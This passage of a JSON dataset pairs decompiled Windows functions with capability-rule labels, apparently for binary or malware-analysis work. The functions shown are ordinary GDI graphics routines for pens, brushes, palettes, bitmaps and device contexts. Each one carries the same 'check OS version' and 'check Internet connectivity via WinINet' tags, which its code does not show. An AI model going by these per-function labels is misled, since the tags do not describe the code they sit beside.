        "decompiled_code": "\nuint fcn.00424d00(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack28 = 0x424d1f;\n        fcn.00423a1c();\n        uStack32 = 0x424d86;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        if (*(var_4h + 8) == 0) {\n            var_14h = *(*(var_4h + 0x1c) * 2 + 0x491dfc);\n            var_10h = *(var_4h + 0x18);\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00424230();\n            puStack40 = &fcn.00424d00::var_14h;\n            uVar1 = sub.gdi32.dll_CreatePenIndirect();\n            *(var_4h + 8) = uVar1;\n        }\n        *in_FS_OFFSET = puStack40;\n        uStack32 = 0x424d8d;\n        iStack36 = 0x424d85;\n        uVar1 = fcn.00423a28();\n        return uVar1;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 401
    },
    "00424fec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00424fec(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack24 = 0x42500f;\n        fcn.00423a1c();\n        uStack28 = 0x4250ba;\n        puStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        if (*(var_4h + 8) == 0) {\n            if (*(var_4h + 0x18) == NULL) {\n                var_8h = 0;\n                uVar1 = *(var_4h + 0x1c);\n                if (uVar1 == 0) {\n                    var_10h = 0;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else if (uVar1 == 1) {\n                    var_10h = 1;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else {\n                    var_10h = 2;\n                    var_8h = (uVar1 & 0x7f) - 2;\n                    puStack24 = &stack0xfffffffc;\n                }\n            }\n            else {\n                var_10h = 3;\n                puStack24 = &stack0xfffffffc;\n                (**(**(var_4h + 0x18) + 0x70))();\n                var_8h = (**(**(var_4h + 0x18) + 0x68))();\n            }\n            var_ch = fcn.00424230();\n            puStack32 = &fcn.00424fec::var_10h;\n            uVar2 = sub.gdi32.dll_CreateBrushIndirect();\n            *(var_4h + 8) = uVar2;\n        }\n        *in_FS_OFFSET = puStack32;\n        puStack24 = 0x4250c1;\n        uStack28 = 0x4250b9;\n        uVar2 = fcn.00423a28();\n        return uVar2;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 557
    },
    "00425460": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00425460(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uchar *puStack20;\n    uchar auStack16 [8];\n    \n    uVar2 = 0;\n    if ((*(in_EAX + 0x54) & 0x80) != 0) {\n        iVar1 = fcn.00425714();\n        sub.gdi32.dll_GetWindowOrgEx();\n        puStack20 = auStack16;\n        if (iVar1 != 0) {\n            uVar2 = 1;\n            puStack20 = auStack16;\n        }\n    }\n    return CONCAT44(puStack20, uVar2);\n}\n",
        "token_count": 156
    },
    "004255ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.004255ac(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_1h;\n    \n    uStack16 = 0x499a30;\n    puStack20 = 0x4255bd;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack24 = 0x4255f8;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x50) == 0) {\n        puStack20 = &fcn.004255ac::var_1h + 1;\n        fcn.004253d0();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4255ff;\n    uStack24 = 0x499a30;\n    uStack28 = 0x4255f7;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 251
    },
    "00425b28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425b28(char param_1, uint *param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff44;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint lpvObject;\n    uint var_30h;\n    uint var_2ch;\n    uint hdcDest;\n    int32_t var_18h;\n    int32_t hdc;\n    int32_t var_10h;\n    uint nWidth;\n    uint nHeight;\n    uint hgdiobj;\n    \n    nWidth = *param_2;\n    nHeight = param_2[1];\n    uStack72 = 0;\n    uStack76 = 0x425b44;\n    hgdiobj = in_EAX;\n    var_18h = sub.gdi32.dll_CreateCompatibleDC();\n    uStack76 = 0;\n    puStack80 = 0x425b4e;\n    hdcDest = sub.gdi32.dll_CreateCompatibleDC();\n    uStack84 = 0x425c76;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = &fcn.00425b28::lpvObject;\n    uStack96 = 0x18;\n    uStack100 = hgdiobj;\n    uStack104 = 0x425b6e;\n    puStack80 = &stack0xfffffffc;\n    sub.gdi32.dll_GetObjectA();\n    if (param_1 != '\\0') {\n        uStack104 = 0;\n        puStack108 = 0x1;\n        uStack112 = 1;\n        iStack116 = nHeight;\n        var_10h = sub.gdi32.dll_CreateBitmap(nWidth);\n        if (var_10h != 0) {\n            iVar1 = sub.gdi32.dll_SelectObject(var_18h, hgdiobj);\n            iVar2 = sub.gdi32.dll_SelectObject(hdcDest, var_10h);\n            sub.gdi32.dll_StretchBlt(hdcDest, 0, 0, nWidth, nHeight, var_18h, 0, 0, var_30h, var_2ch, 0xcc0020);\n            if (iVar1 != 0) {\n                in_stack_ffffff44 = var_18h;\n                sub.gdi32.dll_SelectObject(var_18h, iVar1);\n            }\n            if (iVar2 != 0) {\n                sub.gdi32.dll_SelectObject(hdcDest, iVar2);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffff44;\n        sub.gdi32.dll_DeleteDC(var_18h, 0x425c7d);\n        sub.gdi32.dll_DeleteDC(hdcDest);\n        return;\n    }\n    uStack104 = 0;\n    puStack108 = 0x425b91;\n    hdc = sub.user32.dll_GetDC();\n    if (hdc == 0) {\n        puStack108 = 0x425b9f;\n        fcn.00425a70();\n    }\n    uStack112 = 0x425be5;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    iVar1 = hdc;\n    puStack108 = &stack0xfffffffc;\n    var_10h = sub.gdi32.dll_CreateCompatibleBitmap(hdc, nWidth, nHeight);\n    if (var_10h == 0) {\n        fcn.00425a70();\n    }\n    *in_FS_OFFSET = iVar1;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x425bec);\n    return;\n}\n",
        "token_count": 882
    },
    "00425cc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00425cc8(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h, \n            uint hdc, int32_t arg_28h, int32_t arg_2ch)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    int32_t hpal;\n    uint var_20h;\n    uint crColor;\n    uint var_18h;\n    uint hgdiobj;\n    uint hdcDest;\n    uint nYOriginDest;\n    uint nXOriginDest;\n    \n    if (((**0x494d14 == 2) && (arg_18h == arg_2ch)) && (arg_14h == arg_28h)) {\n        uStack56 = 1;\n        puStack60 = 0x1;\n        uStack64 = hdc;\n        uStack68 = 0x425d10;\n        sub.gdi32.dll_CreateCompatibleBitmap();\n        uStack68 = 0x425d15;\n        uStack68 = fcn.00425b18();\n        iStack72 = arg_10h;\n        puStack76 = 0x425d25;\n        uVar1 = sub.gdi32.dll_SelectObject();\n        uStack80 = 0x425d90;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        uVar5 = 0xccaa0029;\n        uVar2 = uVar1;\n        puStack76 = &stack0xfffffffc;\n        sub.gdi32.dll_MaskBlt();\n        *in_FS_OFFSET = in_EAX;\n        uVar2 = sub.gdi32.dll_SelectObject\n                          (arg_10h, uVar1, 0x425f44, arg_2ch, arg_28h, hdc, arg_20h, arg_1ch, uVar2, arg_ch, arg_8h, \n                           uVar5);\n        sub.gdi32.dll_DeleteObject(uVar2);\n        return;\n    }\n    uStack56 = 0;\n    puStack60 = 0x425da3;\n    sub.gdi32.dll_CreateCompatibleDC();\n    puStack60 = 0x425da8;\n    uVar2 = fcn.00425b18();\n    uStack64 = 0x425f3d;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    iStack72 = arg_14h;\n    puStack76 = arg_18h;\n    uStack80 = hdc;\n    uStack84 = 0x425dc4;\n    puStack60 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack84 = 0x425dc9;\n    uVar1 = fcn.00425b18();\n    uStack84 = uVar1;\n    iVar3 = sub.gdi32.dll_SelectObject(uVar2);\n    iVar4 = sub.gdi32.dll_SelectPalette(hdc, *0x4999fc, 0);\n    sub.gdi32.dll_SelectPalette(hdc, iVar4, 0);\n    if (iVar4 == 0) {\n        hpal = sub.gdi32.dll_SelectPalette(uVar2, *0x4999fc, 0xffffffff);\n    }\n    else {\n        hpal = sub.gdi32.dll_SelectPalette(uVar2, iVar4, 0xffffffff);\n    }\n    sub.gdi32.dll_RealizePalette(uVar2);\n    sub.gdi32.dll_StretchBlt(uVar2, 0, 0, arg_18h, arg_14h, arg_10h, arg_ch, arg_8h, arg_18h, arg_14h, 0xcc0020);\n    sub.gdi32.dll_StretchBlt(uVar2, 0, 0, arg_18h, arg_14h, hdc, arg_20h, arg_1ch, arg_18h, arg_14h, 0x440328);\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    if (iVar3 != 0) {\n        sub.gdi32.dll_SelectObject(uVar2, iVar3);\n    }\n    sub.gdi32.dll_DeleteObject();\n    *in_FS_OFFSET = uVar1;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar2, hpal, 0, 0x425f44);\n    }\n    sub.gdi32.dll_DeleteDC(uVar2);\n    return;\n}\n",
        "token_count": 1140
    },
    "00426178": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00426178(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffb8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint hdc;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if (*0x4999fc != 0) {\n        uStack20 = 0;\n        puStack24 = 0x426195;\n        uVar1 = sub.user32.dll_GetDC();\n        uStack28 = 0x4261fe;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &fcn.00426178::var_1h + 1;\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar1, 0x68);\n        if (0xf < iVar2) {\n            sub.gdi32.dll_GetPaletteEntries(*0x4999fc, 0, 8, in_EAX + 4);\n            in_stack_ffffffb8 = *0x4999fc;\n            sub.gdi32.dll_GetPaletteEntries(*0x4999fc, 8, 8, in_EAX + -0x1c + *(in_EAX + 2) * 4);\n            var_1h._0_1_ = 1;\n        }\n        *in_FS_OFFSET = in_stack_ffffffb8;\n        uVar1 = sub.user32.dll_ReleaseDC(0, uVar1, 0x426205);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 416
    },
    "00426210": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00426210(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uStack1080;\n    uint32_t uStack1076;\n    uint uStack1072;\n    uint32_t uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uchar *puStack1056;\n    uint32_t uStack1052;\n    uint uStack1048;\n    uint uStack1044;\n    ushort uStack1040;\n    \n    uStack1040 = 0x300;\n    if (in_EAX == 0) {\n        uStack1044 = 0x426273;\n        fcn.004030fc();\n    }\n    else {\n        uStack1044 = 0;\n        uStack1048 = 0x42622e;\n        uVar3 = sub.gdi32.dll_CreateCompatibleDC();\n        puStack1056 = 0x426237;\n        uStack1052 = uVar3;\n        uVar4 = sub.gdi32.dll_SelectObject();\n        puStack1056 = &stack0xfffffbe8;\n        uStack1060 = 0x100;\n        uStack1064 = 0;\n        uStack1072 = 0x42624b;\n        uStack1068 = uVar3;\n        uVar2 = sub.gdi32.dll_GetDIBColorTable();\n        uStack1068 = uStack1068 & 0xffff | uVar2 << 0x10;\n        uStack1080 = 0x426257;\n        uStack1076 = uVar3;\n        uStack1072 = uVar4;\n        sub.gdi32.dll_SelectObject();\n        uStack1080 = uVar3;\n        sub.gdi32.dll_DeleteDC();\n    }\n    if (uStack1080._2_2_ != 0) {\n        if ((uStack1080._2_2_ != 0x10) || (cVar1 = fcn.00426178(),  cVar1 == '\\0')) {\n            fcn.0042600c();\n        }\n        uVar4 = sub.gdi32.dll_CreatePalette(&stack0xfffffbc8);\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 520
    },
    "004262b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.004262b4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack44;\n    \n    if (((in_EAX != 0) && (iVar1 = sub.gdi32.dll_GetObjectA(),  iVar1 != 0)) && (in_EAX != 0)) {\n        sub.gdi32.dll_GetPaletteEntries();\n        fcn.0042600c();\n        iStack44 = in_EAX;\n    }\n    return CONCAT44(iStack44, iStack44);\n}\n",
        "token_count": 120
    },
    "00426308": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426308(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    int32_t iStack76;\n    uint uStack68;\n    int32_t iStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint lpbInit;\n    uint hdc;\n    uint var_ch;\n    uint var_8h;\n    uint lpbmih;\n    \n    *(in_EAX + 8) = *(in_EAX + 8) >> 1;\n    uStack40 = 0x426336;\n    iVar1 = fcn.00425ca8();\n    *(in_EAX + 0x14) = iVar1 * *(in_EAX + 8);\n    uStack40 = 0x42634e;\n    iVar1 = fcn.00425c88();\n    uStack40 = 0;\n    puStack44 = 0x426357;\n    iStack76 = sub.user32.dll_GetDC();\n    if (iStack76 == 0) {\n        puStack44 = 0x426365;\n        fcn.00425a1c();\n    }\n    uStack48 = 0x4264b5;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    iStack64 = in_EAX + 0x28 + iVar1 * 4;\n    uStack56 = 0;\n    uStack68 = 4;\n    puStack80 = 0x42639f;\n    puStack44 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateDIBitmap();\n    puStack80 = 0x4263a4;\n    uVar2 = fcn.00425b18();\n    uStack84 = 0x4263db;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = fcn.00425b28();\n    *in_EDX = uVar3;\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x4263e2;\n    uStack88 = 0x4263da;\n    uStack84 = uVar2;\n    sub.gdi32.dll_DeleteObject();\n    return;\n}\n",
        "token_count": 574
    },
    "00426564": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426564(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar3;\n    int32_t iStack156;\n    uint uStack152;\n    uchar *puStack148;\n    uint uStack144;\n    int32_t iStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint hdc;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack132 = 0x42658a;\n    fcn.00402ee8();\n    uStack136 = 0x42685d;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    uStack144 = 0x4265a9;\n    puStack132 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    if ((*arg_ch | arg_ch[1]) == 0) {\n        uStack144 = 0xb;\n        puStack148 = 0x4265b7;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        *arg_8h = uVar1;\n        puStack148 = 0xc;\n        uStack152 = 0x4265c3;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        arg_8h[1] = uVar1;\n    }\n    else {\n        *arg_8h = *arg_ch;\n        arg_8h[1] = arg_ch[1];\n    }\n    uStack144 = 0;\n    puStack148 = 0x4265df;\n    iVar2 = sub.user32.dll_GetDC();\n    if (iVar2 == 0) {\n        puStack148 = 0x4265ed;\n        fcn.00425a1c();\n    }\n    uStack152 = 0x42664d;\n    iStack156 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff64;\n    puStack148 = &stack0xfffffffc;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xe);\n    iVar3 = iVar2;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xc);\n    *in_FS_OFFSET = iVar3;\n    sub.user32.dll_ReleaseDC(0, iVar2, 0x426654);\n    return;\n}\n",
        "token_count": 576
    },
    "00426888": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426888(uint32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uchar auStack96 [4];\n    int16_t iStack92;\n    int16_t iStack90;\n    uint32_t auStack84 [18];\n    \n    auStack84[3] = 0;\n    iVar1 = sub.gdi32.dll_GetObjectA();\n    if (iVar1 == 0) {\n        fcn.004259f8();\n    }\n    else if ((iVar1 < 0x40) || (auStack84[0] < 0x28)) {\n        fcn.00403af4();\n        *param_2 = 0x28;\n        param_2[1] = 0x54;\n        param_2[2] = auStack96;\n    }\n    else {\n        puVar3 = auStack84;\n        puVar4 = param_2;\n        for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    if (param_1 == 2) {\n        *(param_2 + 0xe) = 1;\n    }\n    else if (param_1 - 3 < 0xe) {\n        *(param_2 + 0xe) = 4;\n        param_2[8] = param_1;\n    }\n    else if (param_1 - 0x11 < 0xf0) {\n        *(param_2 + 0xe) = 8;\n        param_2[8] = param_1;\n    }\n    else {\n        *(param_2 + 0xe) = iStack90 * iStack92;\n    }\n    *(param_2 + 3) = 1;\n    if (param_2[8] < param_2[9]) {\n        param_2[9] = param_2[8];\n    }\n    if (param_2[5] == 0) {\n        iVar1 = fcn.00425ca8();\n        uVar2 = param_2[2] >> 0x1f;\n        param_2[5] = iVar1 * ((param_2[2] ^ uVar2) - uVar2);\n    }\n    return;\n}\n",
        "token_count": 564
    },
    "004269dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004269dc(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint hdc;\n    int32_t hpal;\n    uint var_1h;\n    \n    uStack32 = 0x4269f7;\n    fcn.00426888();\n    hpal = 0;\n    uStack32 = 0;\n    puStack36 = 0x426a03;\n    uVar1 = sub.gdi32.dll_CreateCompatibleDC();\n    uStack40 = 0x426a79;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.004269dc::var_1h + 1;\n    if (in_EDX != 0) {\n        puStack36 = &fcn.004269dc::var_1h + 1;\n        hpal = sub.gdi32.dll_SelectPalette(uVar1);\n        sub.gdi32.dll_RealizePalette(uVar1);\n    }\n    uVar4 = *(in_ECX + 8);\n    uVar3 = uVar1;\n    iVar2 = sub.gdi32.dll_GetDIBits();\n    var_1h._0_1_ = iVar2 != 0;\n    *in_FS_OFFSET = uVar3;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar1, hpal, 0, 0x426a80, uVar4, arg_ch);\n    }\n    sub.gdi32.dll_DeleteDC(uVar1);\n    return;\n}\n",
        "token_count": 440
    },
    "00426ab4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00426ab4(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint *puStack104;\n    uint var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint piconinfo;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ah;\n    ushort var_26h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack104 = 0x426ad3;\n    fcn.00403af4();\n    puStack104 = 0x426ae2;\n    fcn.00403af4();\n    puStack104 = &fcn.00426ab4::piconinfo;\n    puStack112 = 0x426aec;\n    uStack108 = param_2;\n    sub.user32.dll_GetIconInfo();\n    puStack112 = 0x426af1;\n    fcn.00426aa8();\n    uStack116 = 0x426ca4;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &fcn.00426ab4::var_1h + 1;\n    fcn.0042696c(2);\n    puStack132 = 0x426b1f;\n    fcn.0042696c(0xffffffff);\n    var_18h = 0;\n    var_1ch = 0;\n    var_20h = 0;\n    var_24h = 0;\n    uStack136 = 0x426c7d;\n    uStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &fcn.00426ab4::var_1h + 1;\n    var_18h = fcn.00402ee8();\n    var_1ch = fcn.00402ee8();\n    var_20h = fcn.00402ee8();\n    var_24h = fcn.00402ee8();\n    fcn.004269dc(2, var_1ch);\n    uVar3 = 0xffffffff;\n    fcn.004269dc(0xffffffff, var_24h);\n    if (var_1h != '\\0') {\n        var_30h = var_ch + 0x16 + var_14h + var_10h;\n        (**(*in_EAX + 0x10))();\n    }\n    var_2ah._2_2_ = 1;\n    var_26h = 1;\n    (**(*in_EAX + 0x10))();\n    iVar2 = var_20h;\n    (**(*in_EAX + 0x10))();\n    piVar1 = iVar2 + 8;\n    *piVar1 = *piVar1 + *(iVar2 + 8);\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    *in_FS_OFFSET = uVar3;\n    fcn.00402f1c(0x426c84);\n    fcn.00402f1c();\n    fcn.00402f1c();\n    fcn.00402f1c();\n    return;\n}\n",
        "token_count": 896
    },
    "00426cec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00426cec(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x20) = 1;\n    if (*(in_EAX + 0x12) != 0) {\n        (**(in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00426d04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00426d04(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        uVar2 = (**(**(arg_8h + -8) + 0x1c))();\n        return uVar2 ^ 1;\n    }\n    cVar1 = fcn.004047dc();\n    if ((cVar1 != '\\0') && (cVar1 = (**(**(arg_8h + -8) + 0x18))(),  cVar1 != '\\0')) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 163
    },
    "00426da8": {
        "rules": [
